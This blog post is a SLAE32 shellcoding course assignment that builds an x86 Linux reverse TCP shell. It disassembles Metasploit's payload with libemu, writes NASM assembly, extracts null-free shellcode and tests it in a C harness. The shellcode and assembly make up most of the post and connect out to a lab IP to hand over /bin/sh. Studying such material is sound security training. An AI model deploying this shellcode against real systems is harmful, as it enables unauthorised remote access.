---
layout: post
title: SLAE32 Assignment2
---
![Alt](https://bohansec.com/assets/SHELLCODING32.png "Pentester Academy")

This blog post has been created for completing the requirments of the SecurityTube (Pentester Academy) x86 Assembly Language and Shellcoding on Linux certification:

[x86 Assembly Language and Shellcoding on Linux](https://www.pentesteracademy.com/course?id=3){:target="_blank"}

Student ID: SLAE-1562

### Objects
{% highlight js %}
Create a Shell_Reverse_TCP Shellcode

- Reverse connects to configured IP and Port
- Execute shell on successful connection

IP and Port should be easily configurable
{% endhighlight %}

### Prerequisite

* Install libemu
{% highlight js %}
git clone https://github.com/buffer/libemu
sudo apt-get install autoconf
sudo apt-get install libtool
autoreconf -v -i
./configure --prefix=/opt/libemu
autoreconf -v -i
sudo make install
{% endhighlight %}

* Obtain the Kali (x86) Linux 2020.3 
{% highlight js %}
https://images.kali.org/virtual-images/kali-linux-2020.3-vmware-i386.7z
{% endhighlight %}

### Step1 - Disassemble the linux/x86/shell_reverse_tcp from Metasploit
To create our own reverse TCP shell, we need to know each system calls the shell uses. So, we will disassemble one of the reverse shells from Metasploit and take a look at the system calls it uses. The system calls are quite similar to what we saw in the bind shell, except reverse TCP shell uses connect() instead of bind().

* Go to the Libemu install path, using sctest to disassemble the linux/x86/shell_reverse_tcp
{% highlight js %}
msfvenom -p linux/x86/shell_reverse_tcp  -f raw | ./sctest -vvv -Ss 100000
kali@kali:~/libemu/tools/sctest$ msfvenom -p linux/x86/shell_reverse_tcp  -f raw | ./sctest -vvv -Ss 100000
verbose = 3
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes

[emu 0x0xe76630 debug ] cpu state    eip=0x00417000
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0xe76630 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] cpu state    eip=0x00417000
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0xe76630 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] 31DB                            xor ebx,ebx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417002
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0xe76630 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF ZF 
[emu 0x0xe76630 debug ] F7E3                            mul ebx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417004
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0xe76630 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF ZF 
[emu 0x0xe76630 debug ] 53                              push ebx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417005
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0xe76630 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF ZF 
[emu 0x0xe76630 debug ] 43                              inc ebx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417006
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
[emu 0x0xe76630 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] 53                              push ebx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417007
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] 6A02                            push byte 0x2
[emu 0x0xe76630 debug ] cpu state    eip=0x00417009
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
[emu 0x0xe76630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] 89E1                            mov ecx,esp
[emu 0x0xe76630 debug ] cpu state    eip=0x0041700b
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
[emu 0x0xe76630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] B066                            mov al,0x66
[emu 0x0xe76630 debug ] cpu state    eip=0x0041700d
[emu 0x0xe76630 debug ] eax=0x00000066  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
[emu 0x0xe76630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] CD80                            int 0x80
int socket(int domain=2, int type=1, int protocol=0);
[emu 0x0xe76630 debug ] cpu state    eip=0x0041700f
[emu 0x0xe76630 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
[emu 0x0xe76630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] 93                              xchg eax,ebx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417010
[emu 0x0xe76630 debug ] eax=0x00000001  ecx=0x00416fc2  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] 59                              pop ecx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417011
[emu 0x0xe76630 debug ] eax=0x00000001  ecx=0x00000002  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] B03F                            mov al,0x3f
[emu 0x0xe76630 debug ] cpu state    eip=0x00417013
[emu 0x0xe76630 debug ] eax=0x0000003f  ecx=0x00000002  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] CD80                            int 0x80
int dup2(int oldfd=14, int newfd=2);
[emu 0x0xe76630 debug ] cpu state    eip=0x00417015
[emu 0x0xe76630 debug ] eax=0x00000002  ecx=0x00000002  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] 49                              dec ecx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417016
[emu 0x0xe76630 debug ] eax=0x00000002  ecx=0x00000001  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] 79                              jns 0x1
[emu 0x0xe76630 debug ] cpu state    eip=0x00417011
[emu 0x0xe76630 debug ] eax=0x00000002  ecx=0x00000001  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] B03F                            mov al,0x3f
[emu 0x0xe76630 debug ] cpu state    eip=0x00417013
[emu 0x0xe76630 debug ] eax=0x0000003f  ecx=0x00000001  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] CD80                            int 0x80
int dup2(int oldfd=14, int newfd=1);
[emu 0x0xe76630 debug ] cpu state    eip=0x00417015
[emu 0x0xe76630 debug ] eax=0x00000001  ecx=0x00000001  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: 
[emu 0x0xe76630 debug ] 49                              dec ecx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417016
[emu 0x0xe76630 debug ] eax=0x00000001  ecx=0x00000000  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF ZF 
[emu 0x0xe76630 debug ] 79                              jns 0x1
[emu 0x0xe76630 debug ] cpu state    eip=0x00417011
[emu 0x0xe76630 debug ] eax=0x00000001  ecx=0x00000000  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF ZF 
[emu 0x0xe76630 debug ] B03F                            mov al,0x3f
[emu 0x0xe76630 debug ] cpu state    eip=0x00417013
[emu 0x0xe76630 debug ] eax=0x0000003f  ecx=0x00000000  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF ZF 
[emu 0x0xe76630 debug ] CD80                            int 0x80
int dup2(int oldfd=14, int newfd=0);
[emu 0x0xe76630 debug ] cpu state    eip=0x00417015
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF ZF 
[emu 0x0xe76630 debug ] 49                              dec ecx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417016
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 79                              jns 0x1
[emu 0x0xe76630 debug ] cpu state    eip=0x00417018
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 68C0A8C888                      push dword 0x88c8a8c0
[emu 0x0xe76630 debug ] cpu state    eip=0x0041701d
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 680200115C                      push dword 0x5c110002
[emu 0x0xe76630 debug ] cpu state    eip=0x00417022
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fbe  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 89E1                            mov ecx,esp
[emu 0x0xe76630 debug ] cpu state    eip=0x00417024
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00416fbe  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fbe  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] B066                            mov al,0x66
[emu 0x0xe76630 debug ] cpu state    eip=0x00417026
[emu 0x0xe76630 debug ] eax=0x00000066  ecx=0x00416fbe  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fbe  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 50                              push eax
[emu 0x0xe76630 debug ] cpu state    eip=0x00417027
[emu 0x0xe76630 debug ] eax=0x00000066  ecx=0x00416fbe  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 51                              push ecx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417028
[emu 0x0xe76630 debug ] eax=0x00000066  ecx=0x00416fbe  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 53                              push ebx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417029
[emu 0x0xe76630 debug ] eax=0x00000066  ecx=0x00416fbe  edx=0x00000000  ebx=0x0000000e
[emu 0x0xe76630 debug ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] B303                            mov bl,0x3
[emu 0x0xe76630 debug ] cpu state    eip=0x0041702b
[emu 0x0xe76630 debug ] eax=0x00000066  ecx=0x00416fbe  edx=0x00000000  ebx=0x00000003
[emu 0x0xe76630 debug ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 89E1                            mov ecx,esp
[emu 0x0xe76630 debug ] cpu state    eip=0x0041702d
[emu 0x0xe76630 debug ] eax=0x00000066  ecx=0x00416fb2  edx=0x00000000  ebx=0x00000003
[emu 0x0xe76630 debug ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] CD80                            int 0x80
connect
[emu 0x0xe76630 debug ] cpu state    eip=0x0041702f
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00416fb2  edx=0x00000000  ebx=0x00000003
[emu 0x0xe76630 debug ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 52                              push edx
[emu 0x0xe76630 debug ] cpu state    eip=0x00417030
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00416fb2  edx=0x00000000  ebx=0x00000003
[emu 0x0xe76630 debug ] esp=0x00416fae  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 686E2F7368                      push dword 0x68732f6e
[emu 0x0xe76630 debug ] cpu state    eip=0x00417035
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00416fb2  edx=0x00000000  ebx=0x00000003
[emu 0x0xe76630 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 682F2F6269                      push dword 0x69622f2f
[emu 0x0xe76630 debug ] cpu state    eip=0x0041703a
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00416fb2  edx=0x00000000  ebx=0x00000003
[emu 0x0xe76630 debug ] esp=0x00416fa6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 89E3                            mov ebx,esp
[emu 0x0xe76630 debug ] cpu state    eip=0x0041703c
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00416fb2  edx=0x00000000  ebx=0x00416fa6
[emu 0x0xe76630 debug ] esp=0x00416fa6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 52                              push edx
[emu 0x0xe76630 debug ] cpu state    eip=0x0041703d
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00416fb2  edx=0x00000000  ebx=0x00416fa6
[emu 0x0xe76630 debug ] esp=0x00416fa2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 53                              push ebx
[emu 0x0xe76630 debug ] cpu state    eip=0x0041703e
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00416fb2  edx=0x00000000  ebx=0x00416fa6
[emu 0x0xe76630 debug ] esp=0x00416f9e  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 89E1                            mov ecx,esp
[emu 0x0xe76630 debug ] cpu state    eip=0x00417040
[emu 0x0xe76630 debug ] eax=0x00000000  ecx=0x00416f9e  edx=0x00000000  ebx=0x00416fa6
[emu 0x0xe76630 debug ] esp=0x00416f9e  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] B00B                            mov al,0xb
[emu 0x0xe76630 debug ] cpu state    eip=0x00417042
[emu 0x0xe76630 debug ] eax=0x0000000b  ecx=0x00416f9e  edx=0x00000000  ebx=0x00416fa6
[emu 0x0xe76630 debug ] esp=0x00416f9e  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] CD80                            int 0x80
execve
int execve (const char *dateiname=00416fa6={//bin/sh}, const char * argv[], const char *envp[]);
[emu 0x0xe76630 debug ] cpu state    eip=0x00417044
[emu 0x0xe76630 debug ] eax=0x0000000b  ecx=0x00416f9e  edx=0x00000000  ebx=0x00416fa6
[emu 0x0xe76630 debug ] esp=0x00416f9e  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
[emu 0x0xe76630 debug ] 0000                            add [eax],al
cpu error error accessing 0x00000004 not mapped

stepcount 42
[emu 0x0xe76630 debug ] cpu state    eip=0x00417046
[emu 0x0xe76630 debug ] eax=0x0000000b  ecx=0x00416f9e  edx=0x00000000  ebx=0x00416fa6
[emu 0x0xe76630 debug ] esp=0x00416f9e  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xe76630 debug ] Flags: PF SF 
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int dup2 (
     int oldfd = 14;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 14;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 14;
     int newfd = 0;
) =  0;
int connect (
     int sockfd = 14;
     struct sockaddr_in * serv_addr = 0x00416fbe => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = -2000115520 (host=192.168.200.136);
             };
             char sin_zero = "       ";
         };
     int addrlen = 102;
) =  0;
int execve (
     const char * dateiname = 0x00416fa6 => 
           = "//bin/sh";
     const char * argv[] = [
           = 0x00416f9e => 
               = 0x00416fa6 => 
                   = "//bin/sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;

{% endhighlight %}

* We can also get the graph version of the disassemble process

{% highlight js %}
msfvenom -p linux/x86/shell_reverse_tcp -f raw | ./sctest -vvv -Ss 100000 -G shell_reverse_tcp.dot
dot shell_reverse_tcp.dot -Tpng -o shell_reverse_tcp.png
{% endhighlight %}

![Reverse Shell](https://bohansec.com/assets/shell_reverse_tcp.png "Reverse Shell")

We can see in order for the Reverse TCP shell to work, there are several system calls used:

* socket 
* dup2
* connect
* execve

We can find each system calls number at /usr/include/i386-linux-gnu/asm/unistd_32.h: 

* socket - 359
* dup2 - 63
* connect - 362
* execve - 11

Note: The system call number for socket, dup2, and execve have already known from the creation of bind shell. 

![connect calls](https://bohansec.com/assets/connect.png "connect calls")

### Step2 - Assembly x86 crafting

* EAX - sys call
* EBX - first argument
* ECX - second argument
* EDX - third argument 
* ESI - fourth argument 
* EDI - fifth argument 

we can set all the registers to 0 for later usage as following: 

{% highlight js %}
;init the registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
xor esi, esi
xor edi, edi
{% endhighlight %}

We create a socket at first, “domain”, “type” and “protocol” are arguments we are supposed to pass into. [Socket Man Page](https://man7.org/linux/man-pages/man2/socket.2.html){:target="_blank"}

{% highlight js %}
;create a socket
mov ax, 359 ;call the socket
mov bl, 2 ;set domain to 2
mov cl, 1 ; set type to 1
int 0x80
{% endhighlight %}

"Dup2" takes two arguments, "oldfd" and "newfd". We will set the "oldfd" with the file descriptor returned by "socket". We will call dup2 three times and set "stderr", "stdout", and "stdin" for the "newfd" each time. So, we use a loop which starts at 3, and decreases the value till 0 and calls the dup2 total of three times. [Dup2 Man Page](https://man7.org/linux/man-pages/man2/dup.2.html){:target="_blank"}

{% highlight js %}
;dup2, essentially it gives us ability to enter command and see output in our shell
mov ebx, eax ;get the oldfd
mov cl, 3 ;the newfd, stdin, stdout, std error
dup2:
	xor eax,eax ;reset the eax
	mov al, 63 ;call dup2
	int 0x80
	dec ecx ;minus the ecx by 1
	jns dup2 ;jump if not signed
{% endhighlight %}

"Connect" takes three arguments, "sockfd", "addr" structure, and "addrlen". "sockfd" stores the file descriptor retured from the "socket" system call. We build the "addr" structure with a stack where it contains variable "sin_zero", "sin_addr", "sin_port", and "sin_family". [Connect Man Page](https://man7.org/linux/man-pages/man2/connect.2.html){:target="_blank"}

{% highlight js %}
;call connect
xor ebx, ebx ;clear ebx
mov ebx, esi ;set sockfd to the returned 
mov ax, 362 ;call connect
push edi
push dword 0x88c8a8c0 ;192.168.200.136 in hex c0.a8.c8.88 (0xc0a8c888)
push word 0x5c11 ;port 4444
push word 0x2	;sin family
mov ecx, esp	;let ecx points to the start of the stack
mov dl, 102	;addess length is 102
int 0x80
{% endhighlight %}

"Execve" takes three arguments. We pass the arguments with the stack. Note the stack needs to be passed as a reverse order and in big-endian. Our stack will look like this:

{% highlight js %}
Addr0x0//bin/sh/0x00000000
{% endhighlight %}

{% highlight js %}
;execve
xor eax, eax
push eax ;set envp to 0
push 0x68732f2f ; ib//
push 0x6e69622f ; hs/n
mov ebx, esp ;now our stack is //bin/sh0x00000000, and ebx points to the pathname //bin/sh
push eax	;push another 0 on the stack, so now our stack is 0x0//bin/sh0x00000000
mov edx, esp	;edx points to envp, which is the 0x0
push ebx ; push the memory address of //bin/sh on the stack, so now we have addr0x0//bin/sh0x00000000
mov ecx, esp	;ecx points to the address of the //bin/sh, which is the argument argv
mov al, 11
int 0x80
{% endhighlight %}
[Execve Man Page](https://man7.org/linux/man-pages/man2/execve.2.html){:target="_blank"}

Full working code: 
{% highlight js %}
global _start			

section .text
_start:

	;init the registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
	xor edi, edi

	;create a socket
	mov ax, 359 ;call the socket
	mov bl, 2 ;set domain to 2
	mov cl, 1 ; set type to 1
	int 0x80
	
	mov esi, eax

	;dup2, essentially it gives us ability to enter command and see output in our shell
	mov ebx, eax ;get the oldfd
	mov cl, 3 ;the newfd, stdin, stdout, std error
dup2:
	xor eax,eax ;reset the eax
	mov al, 63 ;call dup2
	int 0x80
	dec ecx ;minus the ecx by 1
	jns dup2 ;jump if not signed

	;call connect
	xor ebx, ebx ;clear ebx
	mov ebx, esi ;set sockfd to the returned 
	mov ax, 362 ;call connect
	push edi
	push dword 0x88c8a8c0 ;192.168.200.136 in hex c0.a8.c8.88 (0xc0a8c888)
	push word 0x5c11 ;port 4444
	push word 0x2	;sin family
	mov ecx, esp	;let ecx points to the start of the stack
	mov dl, 102	;addess length is 102
	int 0x80

	;execve
	xor eax, eax
	push eax ;set envp to 0
	push 0x68732f2f ;ib//

	push 0x6e69622f ;hs/n
	mov ebx, esp ;now our stack is //bin/sh0x00000000, and ebx points to the pathname //bin/sh

	push eax	;push another 0 on the stack, so now our stack is 0x0//bin/sh0x00000000

	mov edx, esp	;edx points to envp, which is the 0x0
	push ebx ;push the memory address of //bin/sh on the stack, so now we have addr0x0//bin/sh0x00000000

	mov ecx, esp	;ecx points to the address of the //bin/sh, which is the argument argv

	mov al, 11 ;call the execve
	int 0x80
{% endhighlight %}

### Step3 - Compile the code
With the compile script obtained from the SLAE32 course, we can compile the code. Note, NASM is installed by default on kali 2020.3. If not, you need to install the NASM first.

Compile.sh:
{% highlight js %}
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o

echo '[+] Done!'
{% endhighlight %}

![compile1](https://bohansec.com/assets/compile1.png "compile1")

### Step4 - Execute the code to confirm the reverse shell is working

![reverse-execute](https://bohansec.com/assets/reverse-execute.png "reverse-execute")

![ip](https://bohansec.com/assets/ip.png "ip")

![reverse-confirm](https://bohansec.com/assets/reverse-confirm.png "reverse-confirm")

### Step5 - Check for null bytes

{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment2$ objdump -d ./reverse_tcp_shell -M intel

./reverse_tcp_shell:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       31 c0                   xor    eax,eax
 8049002:       31 db                   xor    ebx,ebx
 8049004:       31 c9                   xor    ecx,ecx
 8049006:       31 d2                   xor    edx,edx
 8049008:       31 f6                   xor    esi,esi
 804900a:       31 ff                   xor    edi,edi
 804900c:       66 b8 67 01             mov    ax,0x167
 8049010:       b3 02                   mov    bl,0x2
 8049012:       b1 01                   mov    cl,0x1
 8049014:       cd 80                   int    0x80
 8049016:       89 c6                   mov    esi,eax
 8049018:       89 c3                   mov    ebx,eax
 804901a:       b1 03                   mov    cl,0x3

0804901c <dup2>:
 804901c:       31 c0                   xor    eax,eax
 804901e:       b0 3f                   mov    al,0x3f
 8049020:       cd 80                   int    0x80
 8049022:       49                      dec    ecx
 8049023:       79 f7                   jns    804901c <dup2>
 8049025:       31 db                   xor    ebx,ebx
 8049027:       89 f3                   mov    ebx,esi
 8049029:       66 b8 6a 01             mov    ax,0x16a
 804902d:       57                      push   edi
 804902e:       68 c0 a8 c8 88          push   0x88c8a8c0
 8049033:       66 68 11 5c             pushw  0x5c11
 8049037:       66 6a 02                pushw  0x2
 804903a:       89 e1                   mov    ecx,esp
 804903c:       b2 66                   mov    dl,0x66
 804903e:       cd 80                   int    0x80
 8049040:       31 c0                   xor    eax,eax
 8049042:       50                      push   eax
 8049043:       68 2f 2f 73 68          push   0x68732f2f
 8049048:       68 2f 62 69 6e          push   0x6e69622f
 804904d:       89 e3                   mov    ebx,esp
 804904f:       50                      push   eax
 8049050:       89 e2                   mov    edx,esp
 8049052:       53                      push   ebx
 8049053:       89 e1                   mov    ecx,esp
 8049055:       b0 0b                   mov    al,0xb
 8049057:       cd 80                   int    0x80
 {% endhighlight %}

 ### Step6 - Extract the shellcode

{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment2$ objdump -d ./reverse_tcp_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x89\xc3\xb1\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\x31\xdb\x89\xf3\x66\xb8\x6a\x01\x57\x68\xc0\xa8\xc8\x88\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x66\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
{% endhighlight %}

### Step7 - Insert the shellcode into a test program written in C, and compile to test the shellcode

{% highlight js %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x89\xc3\xb1\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\x31\xdb\x89\xf3\x66\xb8\x6a\x01\x57\x68\xc0\xa8\xc8\x88\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x66\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
{% endhighlight %}

